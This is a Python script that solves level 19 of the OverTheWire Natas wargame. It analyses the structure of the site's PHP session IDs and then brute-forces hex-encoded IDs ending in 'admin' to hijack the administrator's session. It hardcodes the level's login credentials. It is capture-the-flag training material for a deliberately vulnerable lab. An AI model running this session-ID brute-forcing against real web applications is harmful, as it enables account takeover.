# -*- coding: utf-8 -*-
"""
Created on Fri Mar 13 19:03:10 2015

@author: George
"""

import requests,sys


def connect_and_get_cookie():
    '''
    Function to extract assigned cookie, With some experimentation we see that the final
    characters in sessid are fixed and dependent upon the username given
    '''
    r = requests.post('http://natas19.natas.labs.overthewire.org',
                auth=('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'),data={'username':'admin','password':'1'})
    return r.cookies['PHPSESSID']

#print connect_and_get_cookie()

def check_lengths(x):
    '''
    Function to find possible lengths of sessid. Experimentation suggests three lengths
    occur. The difference between the lengths is two.
    '''
    lengths=[]    
    for i in range(x):
        
        s=connect_and_get_cookie()
        
        if len(s) not in lengths:
            lengths.append(len(s))
    print 'lengths: ',lengths

#check_lengths(100) 

    

def analyse_sessids(x):
    '''
    Function to analyse sessid composition by length. With username fixed as admin the
    lengths are 14,16 and 18. This function will connect x times, sort the assigned
    sessids by length and store the occuring characters by position to sets. Afterwards
    it will print out the characters that occured in each position.
    '''
    l={14:[[],[],[]],16:[[],[],[],[],[]],18:[[],[],[],[],[],[],[]]}
    for i in range(x):
        s=connect_and_get_cookie()
        
        for j in range(len(s)-11):
            if s[j] not in l[len(s)][j]:
                l[len(s)][j].append(s[j])
                
    for key in l:    
        print 'analysis for length: '+str(key)         
        i=0        
        for li in l[key]:
            print 's['+str(i)+']: ', li         
            i+=1
    return l       
#l=analyse_sessids(500)     

def connect_and_check_id(sessid):
    '''
    Function to connect with a particular id and check the returned text to see
    whether i'm logged in as a regular user. If not then to print the text and
    return true.
    '''
    r = requests.get('http://natas19.natas.labs.overthewire.org',
        auth=('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'),
        cookies={'PHPSESSID':str(sessid)})
    #print r.content    
    if "You are logged in as a regular user" not in r.content:
        print r.content, sessid
        return True


#connect_and_check_id('312d61646d696e')

def get_password():
    '''
    Function to find the password by brute forcing our way to the admins sessid. We used
    as an ansatz for the sessid form the results of our previous analysis.
    '''    
    
    try:
        for i in range(10):
            sess_id=str(3)+str(i)+'2d61646d696e'
            if connect_and_check_id(sess_id):
                sys.exit()
    
        for i in range(10):
            for j in range(10):
                sess_id=str(3)+str(i)+str(3)+str(j)+'2d61646d696e'
                if connect_and_check_id(sess_id):
                    sys.exit()
        
        for i in range(10):
            for j in range(10):
                for k in range(10):
                    sess_id=str(3)+str(i)+str(3)+str(j)+str(3)+str(k)+'2d61646d696e'
                    if connect_and_check_id(sess_id):
                        sys.exit()
    except:
        pass                    

get_password()        
